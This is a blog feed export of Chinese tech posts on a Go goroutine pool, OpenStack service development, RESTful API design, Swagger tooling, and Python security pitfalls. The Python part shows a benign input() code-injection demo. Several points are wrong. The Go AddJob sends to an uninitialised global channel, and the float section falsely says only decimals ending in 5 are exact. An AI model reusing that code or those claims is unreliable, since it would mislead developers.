如何对goroutine做并发限制喃？使用Java和C概念中的线程池来处理是个不错的方法，我们会使用Channel实现Queue+Worker模型, 整个过程：将请求都转发给一个channel，然后初始化多个goroutine读取这个channel中的内容，并进行处 避免接收Channel阻塞如果channel初始化时是没有设置长度的，此时如果协序池都满负荷工作，再有请求过来的话，仍然会出现被block的情况，而且会比没有经过优化的方案还要慢 遇到这种情况，我们应该希望模块能够及时告知调用方，“我已经达到处理极限了，无法给你处理请求了”。其实，这种需求，可以很简单的在Golang中实现：如果channel发送以及接收操作在select语句中执行并且发生阻塞，default语句就会立即执行。 接收执行结果我们既需要把结果发送给某个channel，获取到处理这次请求的结果。解决的方法是：将一个channel实例包含在请求中，goroutine处理完成后将结果写回这个channel 任务超时机制即使是复杂、耗时的任务，也必须设置超时时间。一方面可能是业务对此有时限要求（用户必须在XX分钟内看到结果），另一方面模块本身也不能都消耗在一直无法结束的任务上，使得其他请求无法得到正常处理。因此，也需要对处理流程增加超时机制。 我一般设置超时的方案是：和之前提到的“接收发送给channel之后返回的结果”结合起来，在等待返回channel的外层添加select，并在其中通过time.After()来判断超时 协程的优雅退出协序池里面的协序我们也需要优雅退出，解决方法很简单, 直接通过select监听一个退出channel, 等待外部通知, 好终止协程 实现协程池接下里我们将实现一个满足上述需求的Goroutine pool 流程图 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129package mainimport "os"var ( // MaxWorker is the number of goroutine worker to start MaxWorker = os.Getenv("MAX_WORKERS") // MaxQueue is the job Queue buffered lenth MaxQueue = os.Getenv("MAX_QUEUE") // JobQueue is a buffered channel that we can send work requests on. JobQueue chan Job // WorkerPool is a pool of workers that are instantianted to perform the work WorkerPool chan chan Job)// Job represents the job to be runtype Job struct &#123; ID int task func()&#125;// Worker represents the worker that executes the jobtype Worker struct &#123; ID int InputQueue chan Job OutputQueue chan Result QuitQueue chan bool WorkerPool chan chan Job&#125;// Result use to collect the task resulttype Result struct &#123; JobID int Data interface&#123;&#125; Err error&#125;// GoroutinePool is a pool of workers channels that are registered with the GoroutinePooltype GoroutinePool struct &#123; maxWorkers int maxQueue int JobQueue chan Job ResultQueue chan Result WorkerPool chan chan Job&#125;// NewWorker is factory function to new a workerfunc NewWorker(id int, workerPool chan chan Job) *Worker &#123; worker := Worker&#123; ID: id, InputQueue: make(chan Job), OutputQueue: make(chan Result), WorkerPool: workerPool, QuitQueue: make(chan bool), &#125; return &amp;worker&#125;// Start method starts the run loop for the worker, listening for a quit channel// in case we need to stop itfunc (w Worker) Start() &#123; go func() &#123; for &#123; // register the current worker into the worker queue. w.WorkerPool &lt;- w.InputQueue select &#123; // we have received a work request case job := &lt;-w.InputQueue: job.task() // we have received a signal to stop case &lt;-w.QuitQueue: return &#125; &#125; &#125;()&#125;// Stop signals the worker to stop listening for work requests.func (w Worker) Stop() &#123; go func() &#123; w.QuitQueue &lt;- true &#125;()&#125;// NewGoroutinePool is a factory function to new a GoroutinePoolfunc NewGoroutinePool(maxWorkers int, maxQueue int) *GoroutinePool &#123; return &amp;GoroutinePool&#123; WorkerPool: make(chan chan Job, maxWorkers), JobQueue: make(chan Job, maxQueue), ResultQueue: make(chan Result, maxQueue), maxWorkers: maxWorkers, maxQueue: maxQueue, &#125;&#125;// dispatch use to dispatch the jobfunc (d *GoroutinePool) dispatch() &#123; for &#123; select &#123; case job := &lt;-d.JobQueue: // a job request has benn received go func(job Job) &#123; // try to obtain a worker job channel that is available. // this will block until a worker is idle jobChan := &lt;-d.WorkerPool // dispatch the job to the worker jobChan jobChan &lt;- job &#125;(job) &#125; &#125;&#125;// Run use to starting n number os workersfunc (d *GoroutinePool) Run() &#123; for i := 0; i &lt; d.maxWorkers; i++ &#123; worker := NewWorker(i+1, d.WorkerPool) worker.Start() &#125; go d.dispatch()&#125;// AddJob is a method to add job to job channelfunc (d *GoroutinePool) AddJob(job Job) (msg string, err error) &#123; JobQueue &lt;- job return "add a job to Job queue", nil&#125; 测试]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[如何开发Openstack服务-开篇(一)]]></title>
      <url>%2F2017%2F01%2F10%2Fdevelop-openstack-service%2F</url>
      <content type="text"><![CDATA[openstack是我见过最大最复杂的python项目, 虽然openstack项目的热度在下滑, 但是openstack这套开发理念任然是相当不错的，值得我们学习. 由于工作需要, 我也需要开发一些自定义的openstack服务, 因此想将开发openstack服务的过程以一系列的文章记录下来, 方便需要的人。 openstack简介openstack是一个IaaS平台, 提供计算服务、网络服务、存储服务等, 有3种方式使用openstack提供的服务 API通过API使用OpenStack的方式是由各个服务自己实现的, 这些API都是有统一的形式的，都是采用了HTTP协议实现的符合REST规范的API。 CLI/SDK通过命令行是用OpenStack服务的方式是由一系列项目来提供的，这些项目一般都命名为python-projectclient，比如python-keystoneclient，python-novaclietn等。这些命令行项目分别对应到各个主要的服务，为用户提供命令行操作界面和Python的SDK。比如python-keystoneclient对应到keystone，为用户提供了keystone这个命令，同时也提供了keyston项目的SDK（其实是在SDK的基础上实现了命令行）。这些client项目提供的SDK其实也是封装了对各自服务的API的调用。由于每个主要项目都有一个自己的命令行工具，社区觉得不好，于是又有了一个新的项目python-openstackclient，用来提供一个统一的命令行工具openstack（命令的名字就叫做openstack），这个工具实现了命令行，然后使用各个服务的client项目提供的SDK来完成对应的操作 WebUI通过Web界面使用OpenStack服务这种方式是通过OpenStack的Horizon项目提供的。Horizon项目是一个Django应用，实现了一个面板功能，是传统的MVC开发模型, 不过最新的项目 在慢慢往Angular上迁移。Horizon项目主要是提供一种交互界面，它会通过API来和各个OpenStack服务进行交互，然后在Web界面上展示各个服务的状态；它也会接收用户的操作，然后调用各个服务的API来完成用户对各个服务的使用 因此开发一个完整的openstack项目需要完成上面介绍的3部分的开发，当然API服务是根本。 openstack架构整个openstack的服务是以插件化得方式进行独立开发, 然后通过API相互关联, 比如:接下来我们会以demo的形式开发一个和openstack服务类似的服务，该服务的名称就叫demo openstack中的api服务openstack的API设计风格为RESTful, 如何设计RESTful API我在前面的博客中有介绍, Python的Web开发框架很多，基本上，还活跃的框架都支持RESTful API的开发, 有些框架还专门为RESTful API的开发提供了便利的功能,比如Pecan，有些框架则通过第三方模块来提供这种便利，比如Django和Flask都有不少和REST相关的第三方库。对于框架选择，也没有什么特别好的标准，一般都是比较性能、文档、社区是否活跃等。在我看来，选择流行的一般就不会错下面是openstack keystone关于credential的API: 早期项目的api服务OpenStack项目倾向于不重新发明轮子，一般都会选择现有的库和框架来使用，除非现有的框架不满足需求。因为Web框架的选择很多，而且都满足需求，所以OpenStack项目到目前为止都是使用现成的Web框架。OpenStack早期的项目并没有使用一个框架，而是使用了几个不同的模块来组合出一个框架：Paste + PasteDeploy + Routes + WebOb，这几个不同的模块分别负责应用的WSGI化、URL路由和请求处理等功能。Nova, Glance, Neutron, Keystone等早期的项目都是使用这样的架构来实现RESTful API的。早期的这种技术选型带来的好处是”框架”具备足够的灵活性，缺点则是要把这几个模块组合起来实现一个REST服务，需要写很多代码，连WSGI的入口函数都要自己实现（比如Keystone项目的keystone/common/wsgi.py文件中的class Application）。因为灵活性的好处不是很明显，而代码量大的坏处很明显，比如上面那个class Application需要在每个项目中复制一遍，所以社区的新项目就开始使用新的Web框架Pecan 新项目的api服务Pecan是一个基于对象路由的框架，即灵活又简单。Pecan主要实现了URL路由功能，支持RESTful API。Pecan没有实现模板、session管理和ORM等功能，但是这些功能可以通过其他的模块来实现。对于OpenStack来说，Pecan是一个很好的选择，因为OpenStack项目中统一使用sqlalchemy来实现ORM，API的实现也不需要模板功能，安全控制则基于Keystone体系。使用Pecan来开发REST服务，代码量很少，代码结构也清晰。Ceilometer项目就是使用了Pecan]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[RESTful API 设计规范]]></title>
      <url>%2F2017%2F01%2F06%2Frest-api-design%2F</url>
      <content type="text"><![CDATA[做出一个好的API设计很难。API表达的是你的数据和你的数据使用者之间的契约，因此API的设计往往是站在使用者的角度进行的，而关于RESTful的介绍可以参考阮一峰的博客理解RESTful架构 , 这里同时也参考了他的另一篇博客RESTful API 设计指南在这方面有一篇很出名的文章，这里需要你自己解决翻墙问题Principles of good RESTful API Design 定义 这里有一些非常重要的术语，我将在本文里面一直用到它们 资源(Resource)：一个对象的单独实例，如一只动物 集合(Collection)：一群同种对象，如动物 HTTP：跨网络的通信协议 客户端(Consumer)：可以创建HTTP请求的客户端应用程序 第三方开发者(Third Party Developer)：这个开发者不属于你的项目但是有想使用你的数据 服务器(Server)：一个HTTP服务器或者应用程序，客户端可以跨网络访问它 端点(Endpoint)：这个API在服务器上的URL用于表达一个资源或者一个集合 幂等(Idempotent)：无边际效应，多次操作得到相同的结果 URL段(Segment)：在URL里面已斜杠分隔的内容 数据设计与抽象 理清业务数据流程 规划好你的API的外观要先于开发它实际的功能。首先你要知道数据该如何设计和核心服务/应用程序会如何工作, 这部分的工作 往往就是需要写好 PRD和DRD这些功能文档 站在使用者的角度进行合理抽象 有时候一个集合可以表达一个数据库表，而一个资源可以表达成里面的一行记录，但是这并不是常态。事实上，你的API应该尽可能 通过抽象来分离数据与业务逻辑。这点非常重要，只有这样做你才不会打击到那些拥有复杂业务的第三方开发者， 否则他们是不会使用你的API的。 如何开放API 当然你的服务可能很多部分是不应该通过API暴露出去的。比较常见的例子就是很多API是不允许第三方来创建用户的。 HTTP 动词一个好的RESTful API只允许第三方调用者使用这四个半HTTP动词进行数据交互，并且在URL段里面不出现任何其他的动词。一般来说，GET请求可以被浏览器缓存（通常也是这样的）。例如，缓存请求头用于第二次用户的POST请求。HEAD请求是基于一个无响应体的GET请求，并且也可以被缓存的。 GET (选择)：从服务器上获取一个具体的资源或者一个资源列表。 POST （创建）： 在服务器上创建一个新的资源。 PUT （更新）：以整体的方式更新服务器上的一个资源。 PATCH （更新）：只更新服务器上一个资源的一个属性。 DELETE （删除）：删除服务器上的一个资源。 HEAD ： 获取一个资源的元数据，如数据的哈希值或最后的更新时间。 OPTIONS：获取客户端能对资源做什么操作的信息。 域名 域名是用于访问你的API服务的第一步，因此如何在域名上表现自己提供的API 服务喃，以下有2种方法 应该尽量将API部署在专用域名之下。 如果确定API很简单，不会有进一步扩展，可以考虑放在主域名下。 12https://api.example.com # 专业域名https://example.org/api/ # URI中明确说明 版本化 API是服务器与客户端之间的一个公共契约。如果你对服务器上的API做了一个更改，并且这些更改无法向后兼容， 那么你就打破了这个契约，客户端又会要求你重新支持它。为了避免这样的事情，你既要确保应用程序逐步的演变， 又要让客户端满意。那么你必须在引入新版本API的同时保持旧版本API仍然可用。 随着时间的推移，你可能声明不再支持某些旧版本的API。申明不支持一个特性并不意味着关闭或者破坏它。 而是告诉客户端旧版本的API将在某个特定的时间被删除，并且建议他们使用新版本的API。 如果你只是简单的增加一个新的特性到API上，如资源上的一个新属性或者增加一个新的端点，你不需要增加API的版本。 因为这些并不会造成向后兼容性的问题，你只需要修改文档即可。 这里实现方式有2种： 应该将API的版本号放入URL 将版本号放在HTTP头信息中，但不如放入URL方便和直观, Github采用的就是这种做法 1234567891011121314151617181920https://api.example.com/v1/ # 在URL中说明curl -i https://api.github.com/users/octocat/orgs # HTTP头中表示API版本 HTTP/1.1 200 OK Server: nginx Date: Fri, 12 Oct 2012 23:33:14 GMT Content-Type: application/json; charset=utf-8 Connection: keep-alive Status: 200 OK ETag: &quot;a00049ba79152d03380c34652f2cb612&quot; X-GitHub-Media-Type: github.v3 X-RateLimit-Limit: 5000 X-RateLimit-Remaining: 4987 X-RateLimit-Reset: 1350085394 Content-Length: 5 Cache-Control: max-age=0, private, must-revalidate X-Content-Type-Options: nosniff API ROOT URI API的根地址很重要。可以通过这个列表快速了解你提供的服务，因此，让你的API根入口点保持尽可能的简单。以github的列 123456789101112131415161718192021222324252627282930313233maojun@maojun-mbp# curl https://api.github.com&#123; &quot;current_user_url&quot;: &quot;https://api.github.com/user&quot;, &quot;current_user_authorizations_html_url&quot;: &quot;https://github.com/settings/connections/applications&#123;/client_id&#125;&quot;, &quot;authorizations_url&quot;: &quot;https://api.github.com/authorizations&quot;, &quot;code_search_url&quot;: &quot;https://api.github.com/search/code?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;, &quot;emails_url&quot;: &quot;https://api.github.com/user/emails&quot;, &quot;emojis_url&quot;: &quot;https://api.github.com/emojis&quot;, &quot;events_url&quot;: &quot;https://api.github.com/events&quot;, &quot;feeds_url&quot;: &quot;https://api.github.com/feeds&quot;, &quot;followers_url&quot;: &quot;https://api.github.com/user/followers&quot;, &quot;following_url&quot;: &quot;https://api.github.com/user/following&#123;/target&#125;&quot;, &quot;gists_url&quot;: &quot;https://api.github.com/gists&#123;/gist_id&#125;&quot;, &quot;hub_url&quot;: &quot;https://api.github.com/hub&quot;, &quot;issue_search_url&quot;: &quot;https://api.github.com/search/issues?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;, &quot;issues_url&quot;: &quot;https://api.github.com/issues&quot;, &quot;keys_url&quot;: &quot;https://api.github.com/user/keys&quot;, &quot;notifications_url&quot;: &quot;https://api.github.com/notifications&quot;, &quot;organization_repositories_url&quot;: &quot;https://api.github.com/orgs/&#123;org&#125;/repos&#123;?type,page,per_page,sort&#125;&quot;, &quot;organization_url&quot;: &quot;https://api.github.com/orgs/&#123;org&#125;&quot;, &quot;public_gists_url&quot;: &quot;https://api.github.com/gists/public&quot;, &quot;rate_limit_url&quot;: &quot;https://api.github.com/rate_limit&quot;, &quot;repository_url&quot;: &quot;https://api.github.com/repos/&#123;owner&#125;/&#123;repo&#125;&quot;, &quot;repository_search_url&quot;: &quot;https://api.github.com/search/repositories?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;, &quot;current_user_repositories_url&quot;: &quot;https://api.github.com/user/repos&#123;?type,page,per_page,sort&#125;&quot;, &quot;starred_url&quot;: &quot;https://api.github.com/user/starred&#123;/owner&#125;&#123;/repo&#125;&quot;, &quot;starred_gists_url&quot;: &quot;https://api.github.com/gists/starred&quot;, &quot;team_url&quot;: &quot;https://api.github.com/teams&quot;, &quot;user_url&quot;: &quot;https://api.github.com/users/&#123;user&#125;&quot;, &quot;user_organizations_url&quot;: &quot;https://api.github.com/user/orgs&quot;, &quot;user_repositories_url&quot;: &quot;https://api.github.com/users/&#123;user&#125;/repos&#123;?type,page,per_page,sort&#125;&quot;, &quot;user_search_url&quot;: &quot;https://api.github.com/search/users?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;&#125; Endpoints 一个端点就是指向特定资源或资源集合的URL。针对每一个端点来说，你可能想列出所有可行的HTTP动词和端点的组合。 在RESTful架构中，每个网址代表一种资源（resource），所以网址中不能有动词，只能有名词， 而且所用的名词往往与数据库的表格名对应。一般来说，数据库中的表都是同种记录的 “集合”（collection），所以API中的名词也应该使用复数。 请注意如何展示数据之间的关系，特别是雇员与动物园之间的多对多关系。通过添加一个额外的URL段就可以实现更多的交互能力。 当然没有一个HTTP动词能表示正在解雇一个人，但是你可以使用DELETE一个动物园里的雇员来达到相同的效果。 1234567891011121314151617https://api.example.com/v1/zooshttps://api.example.com/v1/animalshttps://api.example.com/v1/animal_typeshttps://api.example.com/v1/employeesGET /zoos: List all Zoos (ID and Name, not too much detail)POST /zoos: Create a new ZooGET /zoos/ZID: Retrieve an entire Zoo objectPUT /zoos/ZID: Update a Zoo (entire object)PATCH /zoos/ZID: Update a Zoo (partial object)DELETE /zoos/ZID: Delete a ZooGET /zoos/ZID/animals: Retrieve a listing of Animals (ID and Name).GET /animals: List all Animals (ID and Name).POST /animals: Create a new AnimalGET /animals/AID: Retrieve an Animal objectPUT /animals/AID: Update an Animal (entire object)PATCH /animals/AID: Update an Animal (partial object) 过滤和排序 使用过滤和排序有多种原因，因此API应该提供参数，过滤和排序返回结果，降低客户端的复杂度。 如果记录数量很多，服务器不可能都将它们返回给用户。 从客户端的角度来说，最小化网络传输，并让客户端尽可能快的得到查询结果。 从服务器角度来说，响应请求越小负载就越小。 1234?limit=10: 减少返回给客户端的结果数量（用于分页）?offset=10: 发送一堆信息给客户端（用于分页）?animal_type_id=1: 使用条件匹配来过滤记录?sortby=name&amp;order=asc: 对结果按特定属性进行排序 状态码 服务器向用户返回的状态码和提示信息，因为它们是HTTP的标准，所以通用性上有保证， 状态码的完整定义请看HTTP1.1/rfc Status Code define 1234567891011121314151617181920状态码范围说明：1xx：保留给底层HTTP功能使用的，并且估计在你的职业生涯里面也用不着手动发送这样一个状态码出来。2xx：保留给成功消息使用的，你尽可能的确保服务器总发送这些状态码给用户。3xx：保留给重定向用的。大多数的API不会太常使用这类状态码，但是在新的超媒体样式的API中会使用更多一些。4xx：保留给客户端错误用的。例如，客户端提供了一些错误的数据或请求了不存在的内容。这些请求应该是幂等的，不会改变任何服务器的状态。5xx：保留给服务器端错误用的。这些错误常常是从底层的函数抛出来的，并且开发人员也通常没法处理。发送这类状态码的目的是确保客户端能得到一些响应。收到5xx响应后，客户端没办法知道服务器端的状态，所以这类状态码是要尽可能的避免。常见的一些状态码：200 OK - [GET]：服务器成功返回用户请求的数据，该操作是幂等的（Idempotent）。201 CREATED - [POST/PUT/PATCH]：用户新建或修改数据成功。202 Accepted - [*]：表示一个请求已经进入后台排队（异步任务）204 NO CONTENT - [DELETE]：用户删除数据成功。400 INVALID REQUEST - [POST/PUT/PATCH]：用户发出的请求有错误，服务器没有进行新建或修改数据的操作，该操作是幂等的。401 Unauthorized - [*]：表示用户没有权限（令牌、用户名、密码错误）。403 Forbidden - [*] 表示用户得到授权（与401错误相对），但是访问是被禁止的。404 NOT FOUND - [*]：用户发出的请求针对的是不存在的记录，服务器没有进行操作，该操作是幂等的。406 Not Acceptable - [GET]：用户请求的格式不可得（比如用户请求JSON格式，但是只有XML格式）。410 Gone -[GET]：用户请求的资源被永久删除，且不会再得到的。422 Unprocesable entity - [POST/PUT/PATCH] 当创建一个对象时，发生一个验证错误。500 INTERNAL SERVER ERROR - [*]：服务器发生错误，用户将无法判断发出的请求是否成功。 错误处理如果状态码是4xx，就应该向用户返回出错信息。一般来说，返回的信息中将error作为键名，出错信息作为键值即可。 123&#123; error: "Invalid API key"&#125; 返回结果 针对不同操作，服务器向用户返回的结果应该符合以下规范。 123456GET /collection: 返回一系列资源对象GET /collection/resource: 返回单独的资源对象POST /collection: 返回新创建的资源对象PUT /collection/resource: 返回完整的资源对象PATCH /collection/resource: 返回完整的资源对象DELETE /collection/resource: 返回一个空文档 Hypermedia API RESTful API最好做到Hypermedia，即返回结果中提供链接，连向其他API方法，使得用户不查文档，也知道下一步应该做什么 Hypermedia API的设计被称为HATEOAS link: 用户读取这个属性就知道下一步该调用什么API了 rel: rel表示这个API与当前网址的关系（collection关系，并给出该collection的网址） href: API的绝对路径 title: API的标题,用于概述用途 type: API 响应的数据类型 123456&#123;&quot;link&quot;: &#123; &quot;rel&quot;: &quot;collection https://www.example.com/zoos&quot;, &quot;href&quot;: &quot;https://api.example.com/zoos&quot;, &quot;title&quot;: &quot;List of zoos&quot;, &quot;type&quot;: &quot;application/vnd.yourformat+json&quot;&#125;&#125; 12345 maojun@maojun-mbp#curl https://api.github.com/user&#123; &quot;message&quot;: &quot;Requires authentication&quot;, &quot;documentation_url&quot;: &quot;https://developer.github.com/v3&quot;&#125; 认证 认证和授权的用户模型该尽量采用RBAC模型，因为其良好的扩容性。 API认证的手段最好采用OAuth2.0, 简单的可以采用 JWT（Json Web Token） 关于OAuth的简介可以参考阮一峰OAuth2.0简介 关于JWT参考此文JWT使用 内容类型 XML已是过去时了，现代的web统一使用JSON，也就是HTTP头种的Content Type标签采用 application/json 1234567891011121314151617181920212223242526请求报文POST /v1/animal HTTP/1.1Host: api.example.orgAccept: application/jsonContent-Type: application/jsonContent-Length: 24 &#123; &quot;name&quot;: &quot;Gir&quot;, &quot;animal_type&quot;: 12&#125;响应报文HTTP/1.1 200 OKDate: Wed, 18 Dec 2013 06:08:22 GMTContent-Type: application/jsonAccess-Control-Max-Age: 1728000Cache-Control: no-cache &#123; &quot;id&quot;: 12, &quot;created&quot;: 1386363036, &quot;modified&quot;: 1386363036, &quot;name&quot;: &quot;Gir&quot;, &quot;animal_type&quot;: 12&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[如何使用swagger设计出漂亮的RESTful API]]></title>
      <url>%2F2017%2F01%2F05%2Fapi-design-swagger%2F</url>
      <content type="text"><![CDATA[按照现在的趋势，前后端分离几乎已经是业界对开发和部署方式所达成的一种共识, 后台只负责数据的提供和计算，而完全不处理展现。而前端则负责拿到数据，组织数据并展现的工作。这样结构清晰，关注点分离，前后端会变得相对独立并松耦合。而前段和后端对待的契约就是API设计文档, 有了API的设计文档过后, 后端依据设计文件开发后端程序, 前段根据API设计文档模拟服务器,开发前段页面。而Swagger就是其中一种比较优秀的 RESTful API设计工具。 swagger 工具简介swagger是一个RESTful API 的设计工具，官方提供3种工具： swagger-editor 在线编辑器，同时提供编辑-展现-客户端-服务端代码的生成 swagger-ui 展示工具，将编辑器定义好的json描述文件友好展示的工具。 swagger-codegen 生成服务端和客户端的代码。 因为swagger-editor集成了swagger-codegen功能，因此我们仅需要使用swagger-editor和swagger-ui就够了。 编辑器(editor)可以使用在线编辑器，而由于网络原因, 往往不能很好的使用swagger提供的在线编辑器，然而这个在线编辑器也可以本地部署，其次有很多编辑器也有swagger的插件, 通过按照swagger插件，我们也可以配置出一个swagger的编辑器。有了编辑器后，我们需要熟悉使用swagger来设计API的一些语法。 部署本地编辑器安装docker，配置镜像加速，然后拉去镜像到本地运行12docker pull swaggerapi/swagger-editordocker run -p 80:8080 swaggerapi/swagger-editor 使用本地编辑器推荐使用vscode作为编辑器, 安装vscode的Swagger View插件 就可以打造一个 swagger的编辑器了采用yaml编写，然后使用Swagger Preview 查看预览。 swagger2.0语法详情参考swagger2.0官方规范 格式采用json， 因为yaml是json的一个超集，因此也可以使用。通常情况我们通过yaml来完成编辑，最后通过编辑器导出为json文件。 文件结构为一个单独的文件，但是其中definitions部分可以被抽出来为一个独立文件，通过$ref进行引用，按照惯例，这个文件应该被命名为 swagger.json 数据类型用于描述一个数据的数据类型，对象定义时使用。 Common Name type format Comments integer integer int32 signed 32 bits long integer int64 signed 64 bits float number float double number double string string byte string byte base64 encoded characters binary string binary any sequence of octets boolean boolean date string date As defined by full-date - RFC3339 dateTime string date-time As defined by date-time - RFC3339 password string password Used to hint UIs the input needs to be obscured. 规范规范也就是语法，会安装此规范来编写API设计文档。以下列出了所有需要的关键字段 字段名 类型 描述 swagger string 必填项。表示使用的swagger的版本，必须为2.0 info Info Object 必填项。提供API的一些元数据描述 host string 提供该API服务的主机名称或者IP，测试时 使用该地址进程测试。 basePath string API的基本路径,这是相对的host。 如果不包括,API是直属host。 必须以”/“开头 schemes [string] API的传输协议的列表。 在”http”,”https”,”ws”,”wss”其中选择 consumes [string] 一个MIME类型的api可以使用列表。 值必须是所描述的Mime类型 produces [string] MIME类型的api可以产生的列表。 值必须是所描述的Mime类型 paths 路径对象 必填项。可用的路径和操作的API definitions 定义对象 一个对象数据类型定义 parameters 参数定义对象 定义请求参数的对象 responses 反应定义对象 定义请求响应对象 securityDefinitions 安全定义对象 安全方案定义规范,比如认证 security 安全需求对象 这里主要指使用哪种认证手段 tags 标签对象 没个RESTful中资源的标签，列表中的每个标记名称必须是唯一的 externalDocs 外部文档对象 额外的外部文档, 指向外部url 渲染器(ui)swagger-ui的使用很简单swager-ui官方文档 HTML文档渲染渲染器使用官方的swagger-ui，这里我们需要一个web服务器，用来渲染我们刚才编辑完成的api 设计文档。这里一般使用node 的 express为web框架来做这个简单的web服务器 PDF文档渲染将API设计文档渲染成PDF, 流程是这样: swagger.yaml —&gt; asciiDoc—&gt; pdf 使用swagger2markup来生成asciiDoc格式的文档下载swagger2markup工具,下载地址,选择你想要的版本下载使用工具生成asciiDoc, -i指定swagger.yaml的位置, -f指定输出文件名称： 1java -jar swagger2markup-cli-1.1.0.jar convert -i ~/PycharmProjects/doc/api_design/swagger.yaml -f asiidoc/swagger 使用asciidoctor来将asciiDoc换换成PDF这是一个ruby写的工具，我本地不打算部署ruby环境，因此在找一个docker镜像：madduci/docker-asciidoctor-pdf由于访问dockerhub的镜像速度非常慢，因此我将该工具的使用说明复制了下来，镜像使用说明 Docker Image exposing asciidoctor-pdf as entrypoint and /document as mounted volume where to build the fileTo build your own documents as PDF, simply run the container as:docker run –rm -v /path/to/your/document/folder/:/document/ madduci/docker-asciidoctor-pdf /document/your_document.adocIf you want to use some custom styles, just run it asdocker run –rm -v /path/to/your/document/folder/:/document/ madduci/docker-asciidoctor-pdf -a pdf-stylesdir=/document/resources/themes -a pdf-style=your_style -a pdf-fontsdir=/document/resources/fonts /document/your_document.adocand it will generate the pdf in the mounted volume /document 这工具在生成含有中文的pdf文档时有字体问题，因此我修改了字体为微软雅黑字体，以下是修改方法： 添加雅黑字体到当前的Fonts文件夹下面,这里需要标准字体和粗体, 而默认提供的字体只有这些默认提供的字体 1234➜ asiidoc ls Fonts |grep -i &apos;yahei&apos;Microsoft Yahei.ttfyahei.ttfyahei_bold.ttf 修改主题配置default-theme.yml的Noto Serif字段，使用该字体:配置文件下载地址默认配置文件下载地址 12345Noto Serif:normal: yahei.ttfbold: yahei_bold.ttfitalic: yahei.ttfbold_italic: yahei_bold.tt 最后把我们生成好的swagger.adoc, 主题配置文件,字体 放在一个目录下，挂载到docker里面去: 123➜ Downloads ls asiidocFonts swagger.adoc themesdocker run --rm -v $(pwd)/asiidoc/:/document/ madduci/docker-asciidoctor-pdf -a pdf-fontsdir=/document/Fonts -a pdf-stylesdir=/document/themes /document/swagger.adoc 最后查看asiidoc下面就会有生成的pdf文件 代码生成器(codegen)swagger能提供服务端和客户端的代码生成功能,这个功能在swagger-editor上已经集成生成server端代码：生成客户端代码：]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[使用Python中的一些安全建议]]></title>
      <url>%2F2017%2F01%2F02%2Fpython-bestpractice%2F</url>
      <content type="text"><![CDATA[由于Python简洁，优雅，开发效率高，渐渐在计算环境中无处不在。但是如果你不注意，容易编写出具有严重安全隐患的代码, 以下我整理的一些如何编写出安全代码的一些建议。 input函数在Python 2大量的内置功能集合中，input完全就是一个安全灾难。一旦调用它，从标准输入读入的任何东西都会被立即解析为Python代码：12345678910➜ ~ python2Python 2.7.12 (default, Dec 2 2016, 21:51:52)[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.42.1)] on darwinType "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; input()dir()['__builtins__', '__doc__', '__name__', '__package__']&gt;&gt;&gt; input()__import__('sys').exit()➜ ~ 显然，必须永远不使用input函数，除非脚本的标准输入中的数据是完全可信的。 Python 2文档建议将raw_input作为一个安全的替代品。在Python 3中，input函数等同于raw_input，从而一劳永逸地解决了这个隐患 assert语句在 Python 应用中使用 assert 语句在不可能条件下捕获是一个编程习惯。123def verify_credentials(username, password): assert username and password, 'Credentials not supplied by caller' ... authenticate possibly null user with null password ... 然而，在将源代码编译成优化的字节码时（例如， python - O ），Python 并不为 assert 语句生成任何指令。它默默地删除那些程序员写的让程序免受畸形数据攻击的代码，让应用暴露在攻击之中。该漏洞的根本原因在于 assert机制纯粹是为测试目的而设，正如在 C++ 中做的那样。程序员必须使用其他手段以保证数据一致性。 不要使用is来比较int在我们的印象里，int是不可变对象，我们来看看下面这个例子12345678910&gt;&gt;&gt; a = 257&gt;&gt;&gt; b = 257&gt;&gt;&gt; a is bFalse&gt;&gt;&gt; a == bTrue&gt;&gt;&gt; a = 256&gt;&gt;&gt; b = 256&gt;&gt;&gt; a is bTrue 为了避免每次给经常使用到这部分整数分配一个新的内存，Python预先生成并缓存好这些常用整数([-5, 257))，这样的预处理可以加快程序运行时效率，更详细的了解会在以后的Python数据结构源码解读部分做介绍。因此不要使用is比较整数大小，is是用于比较是否为同一对象的，is本身是不是用来干这件事的。 float的舍入问题因为十进制的小数并不能用二进制精确的表达出来, 在十进制中，进制的基数是10，而5正好是10的一半。 2的一半是多少？当然是1了。 所以，十进制的0.5就是二进制的0.1, 而对于二进制来说，只有0和1的变化，那么只有0.1和0.0,这样仅能精确表达十进制0.0和0.5,你以此类推，那么会发现一个结论：如果一个十进制数可以用二进制精确表示，那么它的最后一位肯定是5,所以只有以5结尾的小数才能被精确的计算我们看看下面一个有趣的现象。1234567891011121314151617181920212223242526In [1]: 0.1 + 0.1Out[1]: 0.2In [2]: 0.1 + 0.1 + 0.1Out[2]: 0.30000000000000004In [3]: 0.1 + 0.1 + 0.1 + 0.1Out[3]: 0.4In [4]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[4]: 0.5In [5]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[5]: 0.6In [6]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[6]: 0.7In [7]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[7]: 0.7999999999999999In [8]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[8]: 0.8999999999999999In [9]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[9]: 0.9999999999999999 我看到有位网友的提出的解决方案： 我有一个观点，针对小数精度不够的问题（例如 0.1），软件可以人为的在数据最后一位补 5， 也就是 0.15，这样牺牲一位，但是可以保证数据精度，还原再把那个尾巴 5 去掉。1234567891011In [40]: 0.4 + 0.2Out[40]: 0.6000000000000001In 